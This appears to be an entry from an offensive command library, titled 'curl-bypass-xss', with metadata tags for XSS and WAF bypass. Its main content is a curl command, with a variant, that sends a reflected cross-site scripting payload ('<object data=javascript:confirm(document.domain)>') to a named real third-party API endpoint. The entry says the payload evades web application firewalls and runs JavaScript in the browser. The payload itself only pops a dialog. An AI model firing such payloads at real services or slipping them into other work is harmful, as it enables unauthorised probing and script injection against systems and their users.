---
data: >-
  curl -X GET
  "https://api.semrush.com/reports/v1/projects/YOUR_PROJECT_ID/siteaudit/page/list?url=<object
  data=javascript:confirm(document.domain)>" -H "Authorization: Bearer
  YOUR_API_TOKEN"
tags:
  - xss
  - waf-bypass
type: command
output: null
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T03:47:18.081Z'
id: 73505644-8418-4e40-9a5c-6c4f6880a574
verified: false
validated: true
submitted: true
---
# curl-bypass-xss

## Command

```bash
curl -X GET "https://api.semrush.com/reports/v1/projects/YOUR_PROJECT_ID/siteaudit/page/list?url=<object data=javascript:confirm(document.domain)>" -H "Authorization: Bearer YOUR_API_TOKEN"
```

## Description

Sends WAF-bypassing XSS payload for reflection and execution.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `url=<object data=javascript:confirm(document.domain)>` | Bypass payload | Yes |

## Examples

### Basic Usage

```bash
curl -X GET "https://api.semrush.com/reports/v1/projects/123/siteaudit/page/list?url=<object data=javascript:alert(1)>" -H "Authorization: Bearer token"
```

## Expected Output

Reflected payload that executes JS in browser.

## Related

- [[Related Procedure: Bypass-WAF-for-Reflected-XSS]]
